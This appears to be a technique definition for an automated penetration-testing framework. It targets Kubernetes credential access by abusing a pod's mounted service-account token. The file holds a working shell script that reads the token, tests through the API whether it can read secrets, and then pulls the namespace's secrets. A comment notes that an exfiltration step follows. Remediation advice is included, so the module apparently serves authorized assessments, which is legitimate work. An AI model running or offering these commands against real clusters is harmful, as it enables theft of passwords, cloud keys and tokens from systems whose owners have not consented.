technique: T1552.001
name: K8s SA token → secret enumeration
key: loot:k8s-secret-enum
tactic: [credential-access]
platform: [linux]
ranking:
  exploitability: high
  safety: read-only
  detection: quiet
detect:
  facts_match: {has_k8s_token: true}
execute:
  command: |-
    tok=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    api="${KUBERNETES_SERVICE_HOST:-kubernetes.default}:${KUBERNETES_SERVICE_PORT:-443}"
    ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    # First a cheap SelfSubjectAccessReview to say WHETHER we can read
    # secrets at all — the exfil step comes next and the operator decides
    # scope.
    curl -sk -H "Authorization: Bearer $tok"       "https://$api/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"       -X POST -H 'Content-Type: application/json'       -d "{\"spec\":{\"resourceAttributes\":{\"namespace\":\"$ns\",\"verb\":\"get\",\"resource\":\"secrets\"}}}"
    curl -sk -H "Authorization: Bearer $tok"       "https://$api/api/v1/namespaces/$ns/secrets" | head -c 2000
verify:
  success: "allowed"
cleanup:
  command: ""
report:
  vector_type: k8s_secret_enum
  evidence: "SA token with secrets.get permission in its namespace"
  description: >
    Pod secrets routinely include DB passwords, image-pull secrets, S3
    keys, and the raw tokens of other SAs. A pod SA token with
    ``get secrets`` (or cluster-wide list) is one of the highest-value
    credential pivots in a K8s compromise — the crown jewels of adjacent
    services typically live here.
  remediation: >
    Default SAs must not have secrets access. Use ``automountServiceAccountToken:
    false`` where the pod doesn't call the API. Prefer short-lived
    ``projected: serviceAccountToken`` volumes over static SA tokens.
  refs: [T1552.001]
